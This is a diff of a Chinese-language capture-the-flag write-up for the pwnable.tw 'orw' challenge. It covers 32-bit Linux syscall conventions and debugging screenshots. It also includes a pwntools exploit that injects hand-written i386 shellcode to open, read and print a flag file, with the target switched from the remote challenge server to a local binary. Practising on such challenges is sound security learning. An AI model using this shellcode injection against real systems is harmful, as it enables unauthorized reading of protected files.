@@ -41,7 +41,7 @@ p();
 
 以下是需要注意的点
 
-* [系统调用号](https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)
+* [系统调用号](http://syscalls.kernelgrok.com/)
 
 <!-- todo 调试说明？ -->
 * linux 32位的入参顺序  从右至左依次入栈
@@ -50,17 +50,27 @@ p();
 
 * linux的返回值一般在寄存器eax中
 * sys_open
-    * 
+* sys_read
+* sys_write
 
 
 ## 0x01 调试
 
-将地址入栈
+sys_open
 
-![](assets/2019-08-02-17-16-04.png)
+![](assets/2019-08-04-21-34-05.png)
 
+sys_read
 
-## 0x02
+![](assets/2019-08-04-21-35-59.png)
+
+sys_write
+
+这里的"this is a test flag"是自己创建的，用于调试
+
+![](assets/2019-08-04-21-36-21.png)
+
+## 0x02 EXP
 
 ```py
 # coding:utf-8
@@ -68,8 +78,8 @@ p();
 from pwn import *
 from pwnlib import *
 
-# p = process('./orw')
-p = remote('chall.pwnable.tw', 10001)
+p = process('./orw')
+# p = remote('chall.pwnable.tw', 10001)
 
 
 def gdb_attach(p):
@@ -77,22 +87,52 @@ def gdb_attach(p):
     gdb.attach(proc.pidof(p)[0])
 
 
-push_file_name = shellcraft.i386.pushstr("/home/orw/flag")
-open_file = shellcraft.i386.linux.syscall("SYS_open", 'esp')
-read_file_to_fd = shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
-write_from_fd_to_stdin = shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
-shellcode = push_file_name+open_file + read_file_to_fd+write_from_fd_to_stdin
+# push_file_name = shellcraft.i386.pushstr("/home/orw/flag")
+# open_file = shellcraft.i386.linux.syscall("SYS_open", 'esp')
+# read_file_to_fd = shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
+# write_from_fd_to_stdin = shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
+# shellcode = push_file_name+open_file + read_file_to_fd+write_from_fd_to_stdin
 
-# shellcode = ''
-# shellcode += "xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;"
-# shellcode += "xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;"
-# shellcode += "mov eax,0x4; mov bl,0x1;int 0x80;"
+shellcode = ''
+# open(file,0,0)
+shellcode +=    """
+                xor ecx,ecx;
+                mov eax,0x5;
+                push ecx;
+                push 0x67616c66;
+                push 0x2f77726f;
+                push 0x2f656d6f;
+                push 0x682f2f2f;
+                mov ebx,esp;
+                xor edx,edx;
+                int 0x80;
+                """
+# read(3,file,0x30)
+shellcode +=    """
+                mov eax,0x3;
+                mov ecx,ebx;
+                mov ebx,0x3;
+                mov dl,0x30;
+                int 0x80;
+                """
+# write(1,file,0x30)
+shellcode +=    """
+                mov eax,0x4;
+                mov bl,0x1;
+                int 0x80;
+                """
 
 p.recvuntil(":")
 payload = asm.asm(shellcode)
-# gdb_attach(p)
+gdb_attach(p)
 p.send(payload)
 p.interactive()
 
-
 ```
+
+## 0x03 其他
+
+看到[Anciety的博客](https://blog.csdn.net/qq_29343201/article/details/78109066?locationNum=3&fps=1)，打算试试dump
+（给学弟递茶）
+
+Todo 过段时间再弄
